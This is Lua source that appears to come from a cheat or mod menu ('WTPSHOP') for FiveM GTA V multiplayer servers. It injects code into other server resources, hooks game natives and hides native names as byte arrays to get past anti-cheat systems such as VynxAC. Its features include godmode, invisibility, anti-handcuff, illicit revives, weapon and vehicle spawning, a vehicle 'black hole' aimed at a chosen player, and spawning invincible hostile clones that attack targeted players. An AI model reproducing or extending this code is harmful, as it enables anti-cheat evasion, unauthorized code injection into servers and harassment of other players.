                    WTPSHOP.Native(ResetEntityAlpha, ped)
                    _G.WTPSHOPInvisibleThread = false
                end)
            end
        end
    ]], tostring(checked)))
    return true
end

function WTPSHOP:SafeSelfToggle(flagName, enable, loopBody, disableBody)
    WTPSHOP:SoftEnsureBypass()
    if enable then
        ApiRasclat.RouteFeature("self", string.format([[
            _G.%s = true
            if not _G.%sThread then
                _G.%sThread = true
                WTPSHOP.Thread(function()
                    %s
                    _G.%sThread = false
                end)
            end
        ]], flagName, flagName, flagName, loopBody, flagName))
    else
        ApiRasclat.RouteFeature("self", string.format([[
            _G.%s = false
            %s
        ]], flagName, disableBody or ""))
    end
end

function WTPSHOP:ToggleAntiCuff(checked)
    self:SafeSelfToggle("WTPSHOP_AntiCuff", checked, [[
        while _G.WTPSHOP_AntiCuff do
            local ped = WTPSHOP.Native(PlayerPedId)
            if WTPSHOP.Native(IsPedCuffed, ped) then
                WTPSHOP.Native(ClearPedTasksImmediately, ped)
                WTPSHOP.Native(SetEnableHandcuffs, ped, false)
            end
            WTPSHOP.Wait(0)
        end
    ]])
end

function WTPSHOP:ToggleAntiCarry(checked)
    self:SafeSelfToggle("WTPSHOP_AntiCarry", checked, [[
        while _G.WTPSHOP_AntiCarry do
            local ped = WTPSHOP.Native(PlayerPedId)
            if WTPSHOP.Native(IsEntityAttached, ped) then
                WTPSHOP.Native(DetachEntity, ped, true, true)
                WTPSHOP.Native(ClearPedTasksImmediately, ped)
            end
            WTPSHOP.Wait(0)
        end
    ]])
end

function WTPSHOP:ToggleAntiCrashPeds(checked)
    if checked then
        ApiRasclat.RouteFeature("self", [[
            _G.WTPSHOP_AntiCrash = true
            WTPSHOP.Thread(function()
                while _G.WTPSHOP_AntiCrash do
                    local myPed = WTPSHOP.Native(PlayerPedId)
                    local myPos = WTPSHOP.Native(GetEntityCoords, myPed)
                    for _, ped in ipairs(WTPSHOP.Native(GetGamePool, "CPed")) do
                        if ped ~= myPed and WTPSHOP.Native(DoesEntityExist, ped) and not WTPSHOP.Native(IsPedAPlayer, ped) then
                            local dist = #(myPos - WTPSHOP.Native(GetEntityCoords, ped))
                            if dist < 10.0 then
                                WTPSHOP.Native(SetEntityAsMissionEntity, ped, true, true)
                                WTPSHOP.Native(DeleteEntity, ped)
                            end
                        end
                    end
                    WTPSHOP.Wait(200)
                end
            end)
        ]])
    else
        executeCode("any", [[ _G.WTPSHOP_AntiCrash = false ]], "self")
    end
end

function WTPSHOP:ToggleVehicleRemote(checked)
    if checked then
        ApiRasclat.RouteFeature("vehicle", [[
            _G.WTPSHOP_VehRemote = true
            _G.WTPSHOP_VehRemoteSel = nil
            _G.WTPSHOP_VehRemoteFrozen = false
            WTPSHOP.Thread(function()
                while _G.WTPSHOP_VehRemote do
                    WTPSHOP.Wait(0)
                    if WTPSHOP.Native(IsControlJustPressed, 0, 246) then
                        local coords = WTPSHOP.Native(GetEntityCoords, WTPSHOP.Native(PlayerPedId))
                        local best, bestD = nil, 10.0
                        for _, veh in ipairs(WTPSHOP.Native(GetGamePool, "CVehicle")) do
                            local d = #(coords - WTPSHOP.Native(GetEntityCoords, veh))
                            if d < bestD then bestD = d; best = veh end
                        end
                        _G.WTPSHOP_VehRemoteSel = best
                        if best then
                            WTPSHOP.Native(SetEntityDrawOutline, best, true)
                            WTPSHOP.Native(SetEntityDrawOutlineColor, 255, 105, 180, 255)
                        end
                    end
                    local sel = _G.WTPSHOP_VehRemoteSel
                    if sel and WTPSHOP.Native(DoesEntityExist, sel) then
                        if WTPSHOP.Native(IsControlPressed, 0, 38) then
                            local rot = WTPSHOP.Native(GetGameplayCamRot, 2)
                            local radZ = math.rad(rot.z)
                            local radX = math.rad(rot.x)
                            local dir = vector3(-math.sin(radZ) * math.cos(radX), math.cos(radZ) * math.cos(radX), math.sin(radX))
                            WTPSHOP.Native(ApplyForceToEntity, sel, 1, dir.x * 3.5, dir.y * 3.5, dir.z * 3.5, 0.0, 0.0, 0.0, 0, false, true, true, false, true)
                        end
                        if WTPSHOP.Native(IsControlJustPressed, 0, 23) then
                            _G.WTPSHOP_VehRemoteFrozen = not _G.WTPSHOP_VehRemoteFrozen
                            WTPSHOP.Native(FreezeEntityPosition, sel, _G.WTPSHOP_VehRemoteFrozen)
                        end
                    end
                end
            end)
        ]])
        self:Notify("info", "WTPSHOP", "Vehicle Remote: Y=select, E=push, F=freeze", 5000)
    else
        executeCode("any", [[ _G.WTPSHOP_VehRemote = false; _G.WTPSHOP_VehRemoteSel = nil ]], "vehicle")
    end
end

function WTPSHOP:HandleAttackClonePlayer(playerIds)
    if not playerIds or #playerIds == 0 then return end

    local playerIdsStr = table.concat(playerIds, ",")
    MachoHookNative(0x240A18690AE96513, function(modelHash)
        return true, modelHash
    end)

    MachoHookNative(0xD49F9B0955C367DE, function(model, x, y, z, heading, isNetwork, thisScriptCheck)
        return true, model, x, y, z, heading, isNetwork, thisScriptCheck
    end)

    ApiRasclat.SafeRes(string.format([[
        local function decode(tbl)
            local s = ""
            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
            return s
        end
        local function g(n)
            return _G[decode(n)]
        end
        local function wait(n)
            return Citizen.Wait(n)
        end
        local function findClientIdByServerId(sid)
            local players = g({71,101,116,65,99,116,105,118,101,80,108,97,121,101,114,115})()
            for _, pid in ipairs(players) do
                if g({71,101,116,80,108,97,121,101,114,83,101,114,118,101,114,73,100})(pid) == sid then
                    return pid
                end
            end
            return nil
        end
        local function copyPedAppearance(sourcePed, targetPed)
            for i = 0, 11 do
                local drawable = g({71,101,116,80,101,100,68,114,97,119,97,98,108,101,86,97,114,105,97,116,105,111,110})(sourcePed, i)
                local texture = g({71,101,116,80,101,100,84,101,120,116,117,114,101,86,97,114,105,97,116,105,111,110})(sourcePed, i)
                g({83,101,116,80,101,100,67,111,109,112,111,110,101,110,116,86,97,114,105,97,116,105,111,110})(targetPed, i, drawable, texture, 2)
            end
            for i = 0, 7 do
                local propIndex = g({71,101,116,80,101,100,80,114,111,112,73,110,100,101,120})(sourcePed, i)
                local propTexture = g({71,101,116,80,101,100,80,114,111,112,84,101,120,116,117,114,101,73,110,100,101,120})(sourcePed, i)
                if propIndex ~= -1 then
                    g({83,101,116,80,101,100,80,114,111,112})(targetPed, i, propIndex, propTexture)
                else
                    g({67,108,101,97,114,80,101,100,80,114,111,112})(targetPed, i)
                end
            end
            local headBlendData = {g({71,101,116,80,101,100,72,101,97,100,66,108,101,110,100,68,97,116,97})(sourcePed)}
            if headBlendData[1] then
                g({83,101,116,80,101,100,72,101,97,100,66,108,101,110,100,68,97,116,97})(
                    targetPed,
                    headBlendData[2], -- shapeFirst
                    headBlendData[3], -- shapeSecond
                    headBlendData[4], -- shapeThird
                    headBlendData[5], -- skinFirst
                    headBlendData[6], -- skinSecond
                    headBlendData[7], -- skinThird
                    headBlendData[8], -- shapeMix
                    headBlendData[9], -- skinMix
                    headBlendData[10] -- thirdMix
                )
            end
        end
        local function clonePed(ped)
            local coords = g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115})(ped)
            local heading = g({71,101,116,69,110,116,105,116,121,72,101,97,100,105,110,103})(ped)
            local modelHash = g({71,101,116,69,110,116,105,116,121,77,111,100,101,108})(ped)
            g({82,101,113,117,101,115,116,77,111,100,101,108})(modelHash)
            local timeout = 0
            while not g({72,97,115,77,111,100,101,108,76,111,97,100,101,100})(modelHash) and timeout < 500 do
                wait(10)
                timeout = timeout + 1
            end
            if not g({72,97,115,77,111,100,101,108,76,111,97,100,101,100})(modelHash) then return end
            -- Spawn ped 2 units away from player
            local spawnRadius = 2.0
            local spawnX = coords.x + (math.random() * 2 - 1) * spawnRadius
            local spawnY = coords.y + (math.random() * 2 - 1) * spawnRadius
            local spawnZ = coords.z
            local clone = g({67,114,101,97,116,101,80,101,100})(4, modelHash, spawnX, spawnY, spawnZ, heading, true, true)
            if clone and g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(clone) then
                copyPedAppearance(ped, clone)
                g({83,101,116,69,110,116,105,116,121,65,115,77,105,115,115,105,111,110,69,110,116,105,116,121})(clone, true, true)
                g({83,101,116,77,111,100,101,108,65,115,78,111,76,111,110,103,101,114,78,101,101,100,101,100})(modelHash)
                local cloneGroup = g({65,100,100,82,101,108,97,116,105,111,110,115,104,105,112,71,114,111,117,112})("HOSTILE_CLONE_" .. tostring(clone))
                g({83,101,116,80,101,100,82,101,108,97,116,105,111,110,115,104,105,112,71,114,111,117,112,72,97,115,104})(clone, cloneGroup)
                g({83,101,116,82,101,108,97,116,105,111,110,115,104,105,112,66,101,116,119,101,101,110,71,114,111,117,112,115})(5, cloneGroup, g({71,101,116,72,97,115,104,75,101,121})("PLAYER"))
                g({83,101,116,82,101,108,97,116,105,111,110,115,104,105,112,66,101,116,119,101,101,110,71,114,111,117,112,115})(5, g({71,101,116,72,97,115,104,75,101,121})("PLAYER"), cloneGroup)
                
                local weaponHash = g({71,101,116,72,97,115,104,75,101,121})(decode({87,69,65,80,79,78,95,83,84,85,78,71,85,78}))
                g({71,105,118,101,87,101,97,112,111,110,84,111,80,101,100})(clone, weaponHash, 1000, false, true)
                local weaponEntity = g({71,101,116,67,117,114,114,101,110,116,80,101,100,87,101,97,112,111,110,69,110,116,105,116,121,73,110,100,101,120})(clone)
                if weaponEntity and g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(weaponEntity) then
                    g({83,101,116,69,110,116,105,116,121,65,115,77,105,115,115,105,111,110,69,110,116,105,116,121})(weaponEntity, true, true)
                end
                g({83,101,116,80,101,100,68,114,111,112,115,87,101,97,112,111,110,115,87,104,101,110,68,101,97,100})(clone, false)
                g({83,101,116,80,101,100,67,97,110,83,119,105,116,99,104,87,101,97,112,111,110})(clone, false)
                g({84,97,115,107,67,111,109,98,97,116,80,101,100})(clone, ped, 0, 16)
                g({83,101,116,80,101,100,67,111,109,98,97,116,65,116,116,114,105,98,117,116,101,115})(clone, 0, true) -- Always aggressive
                g({83,101,116,80,101,100,70,108,101,101,65,116,116,114,105,98,117,116,101,115})(clone, 0, false) -- Prevent fleeing
                g({83,101,116,69,110,116,105,116,121,73,110,118,105,110,99,105,98,108,101})(clone, true)
                g({83,101,116,80,101,100,67,97,110,82,97,103,100,111,108,108})(clone, false)
            end
        end
        local playerIds = {%s}
        for _, targetServerId in ipairs(playerIds) do
            local clientId = findClientIdByServerId(targetServerId)
            local ped = clientId and g({71,101,116,80,108,97,121,101,114,80,101,100})(clientId) or nil
            if ped and g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(ped) then
                clonePed(ped)
            end
        end
    ]], playerIdsStr))
end

function WTPSHOP:SpawnSelectedVehicle(model)
    if not model or model == "" then return end
    local handled = false

    if not handled and GetResourceState("17mov_BuilderJob") == "started" then
        handled = true
        executeCode('17mov_BuilderJob', string.format([[
            local playerPed = PlayerPedId()
            local coords = GetEntityCoords(playerPed)
            local heading = GetEntityHeading(playerPed)
            local spawnCoords = vector4(coords.x, coords.y, coords.z, heading)

            SpawnVehicle('%s', spawnCoords, true)
        ]], model))
    elseif not handled and GetResourceState("17mov_WindowCleaning") == "started" then
        handled = true
        executeCode('17mov_WindowCleaning', string.format([[
            local playerPed = PlayerPedId()
            local coords = GetEntityCoords(playerPed)
            local heading = GetEntityHeading(playerPed)
            local spawnCoords = vector4(coords.x, coords.y, coords.z, heading)

            SpawnVehicle('%s', spawnCoords, true)
        ]], model))
    elseif not handled and GetResourceState("17mov_GarbageCollector") == "started" then
        handled = true
        executeCode('17mov_GarbageCollector', string.format([[
            local playerPed = PlayerPedId()
            local coords = GetEntityCoords(playerPed)
            local heading = GetEntityHeading(playerPed)
            local spawnCoords = vector4(coords.x, coords.y, coords.z, heading)

            SpawnVehicle('%s', spawnCoords, true)
        ]], model))
    elseif not handled and GetResourceState("17mov_Deliverer") == "started" then
        handled = true
        executeCode('17mov_Deliverer', string.format([[
            local playerPed = PlayerPedId()
            local coords = GetEntityCoords(playerPed)
            local heading = GetEntityHeading(playerPed)
            local spawnCoords = vector4(coords.x, coords.y, coords.z, heading)

            SpawnVehicle('%s', spawnCoords, true)
        ]], model))
    elseif not handled and GetResourceState("17mov_Electrician") == "started" then
        handled = true
        executeCode('17mov_Electrician', string.format([[
            local playerPed = PlayerPedId()
            local coords = GetEntityCoords(playerPed)
            local heading = GetEntityHeading(playerPed)
            local spawnCoords = vector4(coords.x, coords.y, coords.z, heading)

            SpawnVehicle('%s', spawnCoords, true)
        ]], model))
    elseif not handled and GetResourceState("17mov_Postman") == "started" then
        handled = true
        executeCode('17mov_Postman', string.format([[
            local playerPed = PlayerPedId()
            local coords = GetEntityCoords(playerPed)
            local heading = GetEntityHeading(playerPed)
            local spawnCoords = vector4(coords.x, coords.y, coords.z, heading)

            SpawnVehicle('%s', spawnCoords, true)
        ]], model))
    elseif not handled and GetResourceState("lb-phone") == "started" then
        handled = true
        executeCode("lb-phone", ([[ 
            local model = "%s"
            if type(CreateFrameworkVehicle) == "function" then
                local ped = PlayerPedId()
                if DoesEntityExist(ped) then
                    local coords = GetEntityCoords(ped)
                    if coords then
                        local vehicleData = { vehicle = json.encode({ model = model }) }
                        CreateFrameworkVehicle(vehicleData, coords)
                    end
                end
            end
        ]]):format(model))
    elseif not handled and GetResourceState("jg-advancedgarages") == "started" then
        handled = true

        executeCode("jg-advancedgarages", string.format([[
            local coords = GetEntityCoords(PlayerPedId())
            spawnVehicleClient(1, %q, 'WTPSHOP', coords, false, {}, false)
        ]], model))
    elseif not handled and GetResourceState("es_extended") == "started" then
        handled = true
        local coords = GetEntityCoords(PlayerPedId())
        local heading = GetEntityHeading(PlayerPedId())
        executeCode("es_extended", string.format([[
            local model = "%s"
            local coords = vector3(%f, %f, %f)
            local heading = %f
        
            if ESX and ESX.Game and ESX.Game.SpawnVehicle then
                ESX.Game.SpawnVehicle(model, coords, heading, function(vehicle)
                    if DoesEntityExist(vehicle) then
                        SetPedIntoVehicle(PlayerPedId(), vehicle, -1)
                    end
                end)
            end
        ]], model, coords.x, coords.y, coords.z, heading))
    end
end

function WTPSHOP:SpawnSelectedWeapon(weaponModel)
    if not weaponModel or weaponModel == "" then return end
    if not self:EnsureCombatBypassReady("Give Weapon") then return end

    local weaponHash = GetHashKey(weaponModel)
    if weaponHash == 0 then return end

    ApiRasclat.RouteFeature("weapons", string.format([[
        local ped = WTPSHOP.Native(PlayerPedId)
        local setWeapon = %s
        WTPSHOP.Native(GiveWeaponToPed, ped, setWeapon, 60, false, true)
        WTPSHOP.Native(SetPedAmmo, ped, setWeapon, 120)
        WTPSHOP.Native(SetCurrentPedWeapon, ped, setWeapon, true)
    ]], weaponHash))
end

function WTPSHOP:HandleClonePlayer(playerIds)
    if not playerIds or #playerIds == 0 then return end

    local playerIdsStr = table.concat(playerIds, ",")
    ApiRasclat.SafeRes(string.format([[
        local function decode(tbl)
            local s = ""
            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
            return s
        end
        local function g(n)
            return _G[decode(n)]
        end
        local function wait(n)
            return Citizen.Wait(n)
        end
        local function findClientIdByServerId(sid)
            local players = g({71,101,116,65,99,116,105,118,101,80,108,97,121,101,114,115})()
            for _, pid in ipairs(players) do
                if g({71,101,116,80,108,97,121,101,114,83,101,114,118,101,114,73,100})(pid) == sid then
                    return pid
                end
            end
            return nil
        end
        local playerIds = {%s}
        for _, targetServerId in ipairs(playerIds) do
            local clientId = findClientIdByServerId(targetServerId)
            local ped = clientId and g({71,101,116,80,108,97,121,101,114,80,101,100})(clientId) or nil
            if ped and g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(ped) then
                local coords = g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115})(ped)
                local hash = g({71,101,116,69,110,116,105,116,121,77,111,100,101,108})(ped)
                g({82,101,113,117,101,115,116,77,111,100,101,108})(hash)
                while not g({72,97,115,77,111,100,101,108,76,111,97,100,101,100})(hash) do
                    wait(0)
                end
                g({67,114,101,97,116,101,80,101,100})(4, hash, coords.x, coords.y, coords.z, 0.0, true, true)
            end
        end
    ]], playerIdsStr))
end

function WTPSHOP:ToggleBlackHole(state, targetServerId)
    if state then
        self:Notify("success", "WTPSHOP", "Black Hole Activated", 3000)
        executeCode(targetRes, string.format([[
            _G.isBlackholeActive = true
            WTPSHOP.Native(CreateThread, function()
                local targetSid = %d
                local player = GetPlayerFromServerId(targetSid)
                local targetPed = GetPlayerPed(player)
                
                if not DoesEntityExist(targetPed) then targetPed = PlayerPedId() end

                while _G.isBlackholeActive do
                    local targetCoords = GetEntityCoords(targetPed)
                    local vehicles = GetGamePool("CVehicle")
                    
                    for _, vehicle in ipairs(vehicles) do
                        if DoesEntityExist(vehicle) and vehicle ~= GetVehiclePedIsIn(targetPed, false) then
                            if not NetworkHasControlOfEntity(vehicle) then
                                NetworkRequestControlOfEntity(vehicle)
                            end

                            local vehCoords = GetEntityCoords(vehicle)
                            local distance = #(targetCoords - vehCoords)

                            if distance < 250.0 and distance > 2.0 then
                                local dir = targetCoords - vehCoords
                                local force = 25.0 
                                local velocity = (dir / distance) * force
                                WTPSHOP.Native(SetEntityVelocity, vehicle, velocity.x, velocity.y, velocity.z + 1.5)
                            end
                        end
                    end
                    WTPSHOP.Native(Wait, 0)
                end
            end)
        ]], targetServerId or -1))
    else
        self:Notify("info", "WTPSHOP", "Black Hole Deactivated", 3000)
        executeCode(targetRes, [[
            _G.isBlackholeActive = false
        ]])
    end
end

function WTPSHOP:BuildMenuFromWeaponList(categoryWeapons)
    local menuValues = {}

    for _, model in ipairs(categoryWeapons) do
        if WeaponList[model] then
            menuValues[#menuValues + 1] = WeaponList[model].label
        end
    end

    return menuValues
end

function WTPSHOP:GetWeaponModelFromLabel(modelLabel)
    for model, data in pairs(WeaponList) do
        if data.label == modelLabel then
            return model
        end
    end

    return ""
end

function WTPSHOP:BuildDefaultMenu()
    ActiveMenu = {
        {
            label = "Self Options",
            type = "subMenu",
            icon = "ph ph-person",
            categories = {
                {
                    label = "Player",
                    tabs = {
                        { icon = "", type = "scrollable", value = 1, values = { "Native", "Script"}, label = "Revive",
                            onSelect = function(value)
                                if value == "Native" then
                                    ApiRasclat.ExecuteFeature("revive", [[
                                        local selfPed = PlayerPedId()
                                        local c = GetEntityCoords(selfPed)
                                        WTPSHOP.Native(NetworkResurrectLocalPlayer, c.x, c.y, c.z, GetEntityHeading(selfPed), true, false)
                                        WTPSHOP.Native(SetEntityHealth, selfPed, 200)
                                        WTPSHOP.Native(ClearPedTasksImmediately, selfPed)
                                    ]])
                                elseif value == "Script" then
                                    if GetResourceState("VynxAC") == "started" then
                                        executeCode('any', [[
                                            WTPSHOP.Native(TriggerEvent, "sxph:revive")
                                        ]])
                                    elseif GetResourceState("svsecured") == "started" then
                                        executeCode('esx_ambulance', [[
                                            WTPSHOP.Native(TriggerEvent, 'esx_ambulance:revive')
                                        ]])
                                    elseif GetResourceState("esx_ambulancejob") == "started" then
                                        MachoInjectResourceScriptOverride(1, "esx_ambulancejob", [[
                                            stopPlayerDeath({
                                                command = true
                                            })
                                        ]], '=?', 150, 160)
                                    elseif GetResourceState("ars_ambulancejob") == "started" then
                                        executeCode('ars_ambulancejob', [[
                                            stopPlayerDeath()
                                        ]])
                                    elseif GetResourceState("wasabi_ambulance") == "started" then
                                        executeCode('wasabi_ambulance', [[
                                            TriggerEvent('wasabi_ambulance:revive')
                                        ]])
                                    elseif GetResourceState("cfx-keydi-deathscreen") == "started" then
                                        executeCode('cfx-keydi-deathscreen', [[
                                            WTPSHOP.Native(TriggerEvent, 'cfx-keydi-ambulance:revive')
                                        ]])
                                    else
                                        local playerPed = PlayerPedId()
                                        local coords = GetEntityCoords(playerPed)
                                        TriggerScreenblurFadeOut(0)
                                        SetEntityCoordsNoOffset(playerPed, coords.x, coords.y, coords.z, false, false, false)
                                        NetworkResurrectLocalPlayer(coords.x, coords.y, coords.z, heading, 0, false)
                                        SetPlayerInvincible(playerPed, false)
                                        ClearPedBloodDamage(playerPed)

                                        executeCode('any', [[
                                            WTPSHOP.Native(TriggerServerEvent, 'esx:onPlayerSpawn')
                                            WTPSHOP.Native(TriggerEvent, 'esx:onPlayerSpawn')
                                            WTPSHOP.Native(TriggerEvent, 'playerSpawned')
                                        ]])
                                    end
                                end
                            end
                        },
                        { type = "slider", label = "Health", desc = "This will set your health to the desired amount.", scrollType = "onEnter", value = 100, min = 0, max = 100, step = 1.0,
                            onSelect = function(value)
                                if GetResourceState("VynxAC") == "started" then
                                    ApiRasclat.Pool(string.format([[
                                        local setPed = PlayerPedId()
                                        if DoesEntityExist(setPed) and not IsEntityDead(setPed) then
                                            WTPSHOP.Native(SetEntityHealth, setPed, %s)
                                        end
                                    ]], value))
                                else
                                    ApiRasclat.Monitor(string.format([[
                                        WTPSHOP.Native(SetEntityHealth, PlayerPedId(), %s + 100.0)
                                    ]], value))
                                end
                            end
                        },
                        { type = "slider", label = "Armour", desc = "This will set your armour to the desired amount.", scrollType = "onEnter", value = 100, min = 0, max = 100, step = 1.0,
                            onSelect = function(value)
                                if GetResourceState("VynxAC") == "started" then
                                    ApiRasclat.Pool(string.format([[
                                        local setPed = PlayerPedId()
                                        if DoesEntityExist(setPed) and not IsEntityDead(setPed) then
                                            WTPSHOP.Native(SetPedArmour, setPed, %s)
                                        end
                                    ]], value))
                                else
                                    ApiRasclat.Monitor(string.format([[
                                        WTPSHOP.Native(SetPedArmour, PlayerPedId(), %s)
                                    ]], value))
                                end
                            end
                        },
                        { icon = "", type = "button", label = "Heal & Armor", desc = "This will refill your heal and armour to the maximum value.",
                            onSelect = function()
                                if GetResourceState("VynxAC") == "started" then
                                    executeCode('any', [[
                                        local setPed = PlayerPedId()
                                        if DoesEntityExist(setPed) and not IsEntityDead(setPed) then
                                            WTPSHOP.Native(SetEntityHealth, setPed, GetEntityMaxHealth(setPed))
                                            WTPSHOP.Native(SetPedArmour, setPed, 100)
                                        end
                                    ]])
                                else
                                    ApiRasclat.Monitor([[
                                        WTPSHOP.Native(SetEntityHealth, PlayerPedId(), 200)
                                        WTPSHOP.Native(SetPedArmour, PlayerPedId(), 100)
                                    ]])
                                end
                            end
                        },
                        { icon = "", type = "button", label = "Hunger & Thirst", desc = "This refill your Hunger / Thirst.",
                            onSelect = function()
                                if GetResourceState("rryban_secure") == "started" then
                                    executeCode('esx_basicneeds', [[
                                        WTPSHOP.Native(TriggerEvent, 'esx_status:set', 'hunger', 1000000)
                                        WTPSHOP.Native(TriggerEvent, 'esx_status:set', 'thirst', 1000000)
                                        LocalPlayer.state:set('stress', -50)
                                    ]])
                                elseif GetResourceState("ars_ambulancejob") == "started" then
                                    executeCode('ars_ambulancejob', [[
                                        healStatus()
                                    ]])
                                elseif GetResourceState("esx_status") == "started" then
                                    executeCode('any', [[
                                        WTPSHOP.Native(TriggerEvent, 'esx_status:set', 'hunger', 1000000)
                                        WTPSHOP.Native(TriggerEvent, 'esx_status:set', 'thirst', 1000000)
                                        WTPSHOP.Native(TriggerEvent, 'esx_status:set', 'stress', 0)
                                        LocalPlayer.state:set('stress', -50)
                                    ]])
                                elseif GetResourceState("cfx-hu-core") == "started" then
                                    executeCode('any', [[
                                        WTPSHOP.Native(TriggerEvent, "esx_basicneeds:healPlayer")
                                    ]])
                                elseif GetResourceState("es_extended") == "started" then
                                    executeCode('es_extended', [[
                                        WTPSHOP.Native(TriggerEvent, 'es_extended:status:Add', 'hunger', 1000000)
                                        WTPSHOP.Native(TriggerEvent, 'es_extended:status:Add', 'thirst', 1000000)
                                        WTPSHOP.Native(TriggerEvent, 'es_extended:status:Remove', 'stress', 0)
                                    ]])
                                else
                                    executeCode('any', [[
                                        WTPSHOP.Native(TriggerEvent, 'esx_status:set', 'hunger', 1000000)
                                        WTPSHOP.Native(TriggerEvent, 'esx_status:set', 'thirst', 1000000)
                                        WTPSHOP.Native(TriggerEvent, 'esx_status:set', 'stress', 0)
                                        LocalPlayer.state:set('stress', -50)
                                    ]])
                                end
                            end
                        },
                        { type = "checkbox", label = "Godmode", checked = false, desc = "This will give your player godmode.",
                            onSelect = function(checked)
                                self:GodemodeState(checked)
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Invisibility",
                            checked = false,
                            desc = "This will make your player invisible.",
                            onSelect = function(checked)
                                self:EnableInvisibility(checked)
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Super Strength",
                            checked = false,
                            desc = "This will make you super strength.",
                            onSelect = function(checked)
                                if checked then
                                    executeCode("any", [[
                                        if fgawjFmaDjdALaO == nil then fgawjFmaDjdALaO = false end
                                        fgawjFmaDjdALaO = true

                                        local holdingEntity = false
                                        local holdingCarEntity = false
                                        local holdingPed = false
                                        local heldEntity = nil
                                        local entityType = nil

                                        WTPSHOP.Native(CreateThread, function()
                                            while fgawjFmaDjdALaO do
                                                WTPSHOP.Native(Wait, 0)
                                                if holdingEntity and heldEntity then
                                                    local playerPed = PlayerPedId()
                                                    local headPos = GetPedBoneCoords(playerPed, 0x796e, 0.0, 0.0, 0.0)
                                                    DrawText3Ds(headPos.x, headPos.y, headPos.z + 0.5, "[Y] Drop Entity / [U] Attach Ped")
                                                    
                                                    if holdingCarEntity and not IsEntityPlayingAnim(playerPed, 'anim@mp_rollarcoaster', 'hands_up_idle_a_player_one', 3) then
                                                        RequestAnimDict('anim@mp_rollarcoaster')
                                                        while not HasAnimDictLoaded('anim@mp_rollarcoaster') do
                                                            WTPSHOP.Native(Wait, 100)
                                                        end
                                                        TaskPlayAnim(playerPed, 'anim@mp_rollarcoaster', 'hands_up_idle_a_player_one', 8.0, -8.0, -1, 50, 0, false, false, false)
                                                    elseif (holdingPed or not holdingCarEntity) and not IsEntityPlayingAnim(playerPed, 'anim@heists@box_carry@', 'idle', 3) then
                                                        RequestAnimDict('anim@heists@box_carry@')
                                                        while not HasAnimDictLoaded('anim@heists@box_carry@') do
                                                            WTPSHOP.Native(Wait, 100)
                                                        end
                                                        TaskPlayAnim(playerPed, 'anim@heists@box_carry@', 'idle', 8.0, -8.0, -1, 50, 0, false, false, false)
                                                    end

                                                    if not IsEntityAttached(heldEntity) then
                                                        holdingEntity = false
                                                        holdingCarEntity = false
                                                        holdingPed = false
                                                        heldEntity = nil
                                                    end
                                                end
                                            end
                                        end)

                                        WTPSHOP.Native(CreateThread, function()
                                            while fgawjFmaDjdALaO do
                                                WTPSHOP.Native(Wait, 0)
                                                local playerPed = PlayerPedId()
                                                local camPos = GetGameplayCamCoord()
                                                local camRot = GetGameplayCamRot(2)
                                                local direction = RotationToDirection(camRot)
                                                local dest = vec3(camPos.x + direction.x * 10.0, camPos.y + direction.y * 10.0, camPos.z + direction.z * 10.0)

                                                local rayHandle = StartShapeTestRay(camPos.x, camPos.y, camPos.z, dest.x, dest.y, dest.z, -1, playerPed, 0)
                                                local _, hit, _, _, entityHit = GetShapeTestResult(rayHandle)
                                                local validTarget = false

                                                if hit == 1 then
                                                    entityType = GetEntityType(entityHit)
                                                    if entityType == 3 or entityType == 2 or entityType == 1 then
                                                        validTarget = true
                                                        local headPos = GetPedBoneCoords(playerPed, 0x796e, 0.0, 0.0, 0.0)
                                                        DrawText3Ds(headPos.x, headPos.y, headPos.z + 0.5, "[E] Pick Up / [Y] Drop")
                                                    end
                                                end

                                                if IsDisabledControlJustReleased(0, 38) then
                                                    if validTarget and not holdingEntity then
                                                        holdingEntity = true
                                                        heldEntity = entityHit

                                                        if entityType == 3 then
                                                            WTPSHOP.Native(AttachEntityToEntity, heldEntity, playerPed, GetPedBoneIndex(playerPed, 60309), 0.0, 0.2, 0.0, 0.0, 0.0, 0.0, true, true, false, true, 1, true)
                                                        elseif entityType == 2 then
                                                            holdingCarEntity = true
                                                            WTPSHOP.Native(AttachEntityToEntity, heldEntity, playerPed, GetPedBoneIndex(playerPed, 60309), 1.0, 0.5, 0.0, 0.0, 0.0, 0.0, true, true, false, false, 1, true)
                                                        elseif entityType == 1 then
                                                            holdingPed = true
                                                            WTPSHOP.Native(AttachEntityToEntity, heldEntity, playerPed, GetPedBoneIndex(playerPed, 60309), 1.0, 0.5, 0.0, 0.0, 0.0, 0.0, true, true, false, false, 1, true)
                                                        end
                                                    end
                                                elseif IsDisabledControlJustReleased(0, 246) then
                                                    if holdingEntity then
                                                        WTPSHOP.Native(DetachEntity, heldEntity, true, true)
                                                        WTPSHOP.Native(ApplyForceToEntity, heldEntity, 1, direction.x * 500, direction.y * 500, direction.z * 500, 0.0, 0.0, 0.0, 0, false, true, true, false, true)
                                                        holdingEntity = false
                                                        holdingCarEntity = false
                                                        holdingPed = false
                                                        heldEntity = nil
                                                        WTPSHOP.Native(ClearPedTasks, PlayerPedId())
                                                    end
                                                end
                                            end
                                        end)

                                        function RotationToDirection(rotation)
                                            local adjustedRotation = vec3((math.pi / 180) * rotation.x, (math.pi / 180) * rotation.y, (math.pi / 180) * rotation.z)
                                            local direction = vec3(-math.sin(adjustedRotation.z) * math.abs(math.cos(adjustedRotation.x)), math.cos(adjustedRotation.z) * math.abs(math.cos(adjustedRotation.x)), math.sin(adjustedRotation.x))
                                            return direction
                                        end

                                        function DrawText3Ds(x, y, z, text)
                                            local onScreen, _x, _y = World3dToScreen2d(x, y, z)
                                            local px, py, pz = table.unpack(GetGameplayCamCoords())
                                            local scale = (1 / GetDistanceBetweenCoords(px, py, pz, x, y, z, 1)) * 2
                                            local fov = (1 / GetGameplayCamFov()) * 100
                                            scale = scale * fov

                                            if onScreen then
                                                SetTextScale(0.0 * scale, 0.35 * scale)
                                                SetTextFont(0)
                                                SetTextProportional(1)
                                                SetTextColour(235, 0, 121, 0.8)
                                                SetTextDropshadow(0, 0, 0, 0, 155)
                                                SetTextEdge(2, 0, 0, 0, 150)
                                                SetTextDropShadow()
